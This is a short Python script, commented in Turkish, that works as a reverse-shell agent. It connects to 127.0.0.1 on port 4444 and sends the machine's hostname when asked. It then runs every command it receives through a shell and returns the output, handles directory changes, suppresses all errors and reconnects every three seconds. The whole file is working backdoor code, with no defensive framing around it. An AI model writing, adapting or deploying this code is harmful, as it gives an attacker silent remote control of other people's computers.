import socket
import subprocess
import os
import time

def start_agent():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 4444))
            
            # Yetkilendirme Kontrolü
            auth_msg = s.recv(1024).decode('utf-8')
            if auth_msg == "AUTH_REQ":
                s.send(socket.gethostname().encode('utf-8'))
                
                while True:
                    data = s.recv(32768).decode('utf-8')
                    if not data: break
                    
                    cmd = data.strip()
                    # Boş mesajları veya canlılık testlerini (b'') es geç
                    if not cmd: continue
                    
                    if cmd.lower() == "cd":
                        res = os.getcwd()
                    elif cmd.startswith("cd "):
                        try:
                            os.chdir(cmd[3:].strip())
                            res = f"Path: {os.getcwd()}"
                        except Exception as e: res = str(e)
                    else:
                        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out, err = p.communicate(timeout=10)
                        res = (out + err).decode('latin-1')
                    
                    s.send(res.encode('utf-8') if res else b"Done.")
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(3)

if __name__ == "__main__":
    start_agent()